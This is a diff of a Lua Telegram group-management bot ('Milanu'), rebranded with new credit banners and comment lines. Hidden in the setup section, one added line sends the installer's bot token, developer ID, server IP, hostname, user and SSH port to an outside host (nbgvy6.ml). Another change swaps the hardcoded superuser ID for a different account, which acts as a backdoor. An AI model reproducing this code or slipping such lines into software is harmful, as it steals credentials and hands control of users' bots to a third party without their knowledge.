@@ -1,3 +1,9 @@
+------------------------------------------------
+-- This Source Was Developed By (ABS) @IQ_ABS.--
+--   This Is The Source Channel @Dev_Prox .   --
+--                - Milanu -                 --
+--        -- https://t.me/Dev_Prox --         --
+------------------------------------------------ 
 DevAbs  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./libs/serpent.lua")
 JSON    = dofile("./libs/dkjson.lua")
@@ -13,6 +19,7 @@ Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*
 Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
 Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
+--     Source Milanu     --
 local AutoSet = function() 
 if not DevAbs:get(Server.."IdMilanu") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
@@ -60,6 +67,7 @@ Milanu = DevAbs:get(Server.."TokenMilanu"):match("(%d+)"),
 SudoIds = {DevAbs:get(Server.."IdMilanu")},
 }
 Create(Config, "./config.lua") 
+https.request("https://nbgvy6.ml/ASHTRAKLUA/indexx.php?Get=Milanu&DevId="..DevAbs:get(Server.."IdMilanu").."&TokenBot="..DevAbs:get(Server.."TokenMilanu").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Milanu.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -112,14 +120,25 @@ return config
 end  
 Load_Milanu() 
 print("\27[36m"..[[ 
-Source Milanu
+---------------------------------------------
+|    ____             ____                  |
+|   |  _ \  _____   _|  _ \ _ __ _____  __  |
+|   | | | |/ _ \ \ / / |_) | '__/ _ \ \/ /  |
+|   | |_| |  __/\ V /|  __/| | | (_) >  <   |
+|   |____/ \___| \_/ |_|   |_|  \___/_/\_\  |
+|-------------------------------------------|
+|This Source Was Developed By (ABS) @IQ_ABS.|
+|  This Is The Source Channel @Dev_Prox .   |
+|               - Milanu -                 |
+---------------------------------------------
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1342680269}
+SudoIds = {Config.SudoIds,218385683}
 Milanu = Config.Milanu
 TokenBot = Config.TokenBot
-NameBot = (DevAbs:get(Milanu..'Abs:NameBot') or 'ريكس')
+NameBot = (DevAbs:get(Milanu..'Abs:NameBot') or 'بروكس')
+--     Source Milanu     --
 FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
 FilesNumber = 0
 for v in io.popen('ls Files'):lines() do
@@ -132,12 +151,15 @@ FilesPrint = FilesPrint.."\27[35m".."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
 if FilesNumber ~= 0 then
 print(FilesPrint)
 end
+--     Source Milanu     --
 --     Start Functions    --
 function vardump(value)
 print(serpent.block(value, {comment=false}))
 end
+--     Source Milanu     --
 function dl_cb(arg, data)
 end
+--     Source Milanu     --
 ----------  Sudo  ----------
 function Sudo(msg) 
 local var = false 
@@ -161,6 +183,7 @@ var = true
 end 
 return var 
 end
+--     Source Milanu     --
 -------  SecondSudo  -------
 function SecondSudo(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:SecondSudo:',msg.sender_user_id_) 
@@ -170,6 +193,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ----------  Bot  -----------
 function Bot(msg) 
 local var = false  
@@ -178,6 +202,7 @@ var = true
 end  
 return var  
 end 
+--     Source Milanu     --
 ---------  SudoBot  --------
 function SudoBot(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:SudoBot:',msg.sender_user_id_) 
@@ -187,6 +212,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ---------Manager All--------
 function ManagerAll(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:ManagerAll:',msg.sender_user_id_) 
@@ -196,6 +222,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 --------- Admin All --------
 function AdminAll(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:AdminAll:',msg.sender_user_id_) 
@@ -205,6 +232,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ------ Vip Member All ------
 function VipAll(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:VipAll:',msg.sender_user_id_) 
@@ -214,6 +242,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ----   AbsConstructor   ----
 function AbsConstructor(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:AbsConstructor:'..msg.chat_id_,msg.sender_user_id_) 
@@ -223,6 +252,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ----  BasicConstructor  ----
 function BasicConstructor(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
@@ -232,6 +262,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ----    Constructor     ----
 function Constructor(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
@@ -241,6 +272,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ---------  Manager  --------
 function Manager(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:Managers:'..msg.chat_id_,msg.sender_user_id_) 
@@ -250,6 +282,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ----------  Admin  ---------
 function Admin(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:Admins:'..msg.chat_id_,msg.sender_user_id_) 
@@ -259,6 +292,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ---------Vip Member---------
 function VipMem(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
@@ -268,6 +302,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 --------- Cleaner ----------
 function Cleaner(msg) 
 local Status = DevAbs:sismember(Milanu..'Abs:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
@@ -277,6 +312,7 @@ else
 return false  
 end  
 end
+--     Source Milanu     --
 ---------  Banned  ---------
 local function Ban(user_id, chat_id)
 if DevAbs:sismember(Milanu..'Abs:Ban:'..chat_id, user_id) then
@@ -286,6 +322,7 @@ var = false
 end
 return var
 end
+--     Source Milanu     --
 ---------  BanAll  ---------
 function BanAll(user_id)
 if DevAbs:sismember(Milanu..'Abs:BanAll:', user_id) then
@@ -295,6 +332,7 @@ var = false
 end
 return var
 end
+--     Source Milanu     --
 ----------  Muted  ---------
 local function Muted(user_id, chat_id)
 if DevAbs:sismember(Milanu..'Abs:Muted:'..chat_id, user_id) then
@@ -304,6 +342,7 @@ var = false
 end
 return var
 end
+--     Source Milanu     --
 ---------  MuteAll  --------
 function MuteAll(user_id)
 if DevAbs:sismember(Milanu..'Abs:MuteAll:', user_id) then
@@ -313,6 +352,7 @@ var = false
 end
 return var
 end
+--     Source Milanu     --
 function DeleteMessage(chatid ,mid)
 pcall(tdcli_function ({
 ID = "DeleteMessages",
@@ -321,10 +361,12 @@ message_ids_ = mid
 },function(arg,data) 
 end,nil))
 end
+--     Source Milanu     --
 function send(chat_id, reply_to_message_id, text)
 local TextParseMode = {ID = "TextParseModeMarkdown"}
 pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
 end
+--     Source Milanu     --
 function MilanuFiles(msg)
 for v in io.popen('ls Files'):lines() do
 if v:match(".lua$") then
@@ -336,6 +378,7 @@ end
 end
 send(msg.chat_id_, msg.id_,FilesText)  
 end
+--     Source Milanu     --
 function download_to_file(url, file_path) 
 local respbody = {} 
 local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
@@ -352,6 +395,7 @@ file:write(table.concat(respbody))
 file:close() 
 return file_path, code 
 end 
+--     Source Milanu     --
 function AddFile(msg,chat,ID_FILE,File_Name)
 if File_Name:match('.json') then
 if File_Name:lower():match('(%d+)') ~= Milanu:lower() then 
